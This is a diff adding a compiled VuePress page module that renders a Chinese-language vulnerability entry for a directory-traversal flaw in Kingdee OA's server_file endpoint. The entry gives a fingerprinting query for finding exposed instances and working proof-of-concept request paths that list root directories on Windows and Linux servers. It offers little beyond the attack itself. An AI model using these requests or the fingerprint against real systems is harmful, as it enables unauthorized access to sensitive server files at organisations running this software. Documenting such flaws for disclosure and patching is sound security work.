@@ -1,0 +1,10 @@
+import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as i,c as a,e as r}from"./app-58e4a7d6.js";const n={},d=r(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>金蝶OA server_file 存在目录遍历漏洞，攻击者通过目录遍历可以获取服务器敏感信息</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>金蝶OA
+</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>app=&quot;Kingdee-EAS&quot;
+</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>登录界面为</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202090144781.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>漏洞POC</p><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>/appmonitor/protected/selector/server_file/files?folder=/&amp;suffix=
+
+# Windows服务器
+appmonitor/protected/selector/server_file/files?folder=C://&amp;suffix=
+
+# Linux服务器
+appmonitor/protected/selector/server_file/files?folder=/&amp;suffix=
+</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202090144057.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,12),s=[d];function l(t,c){return i(),a("div",null,s)}const u=e(n,[["render",l],["__file","金蝶OA server_file 目录遍历漏洞.html.vue"]]);export{u as default};
